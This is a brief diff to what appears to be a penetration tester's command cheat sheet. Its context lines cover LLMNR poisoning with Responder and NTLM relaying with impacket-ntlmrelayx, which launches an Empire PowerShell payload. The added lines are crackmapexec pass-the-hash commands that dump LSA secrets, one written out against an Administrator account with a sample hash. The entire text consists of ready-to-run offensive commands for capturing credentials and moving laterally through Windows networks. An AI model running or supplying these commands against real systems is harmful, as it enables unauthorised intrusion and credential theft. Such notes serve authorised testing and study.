@@ -39,3 +39,7 @@ llmnr: sudo impacket-ntlmrelayx -tf targets.txt -c <insert your Empire Powershel
 Make sure Responder.conf (typically /etc/responder/Responder.conf) has SMB and HTTP set to Off
 llmnr: Responder often found here: /usr/share/responder/Responder.py -- but not always.
 llmnr: sudo python Responder.py -I <interface> -r -d -w
+
+crackmapexec:Pass-the-Hash
+crackmapexec smb <ip address> -u <user> -H <hash> --lsa
+crackmapexec smb 192.168.1.1 -u Administrator -H cc3838383k3983k393k393k393k --lsa
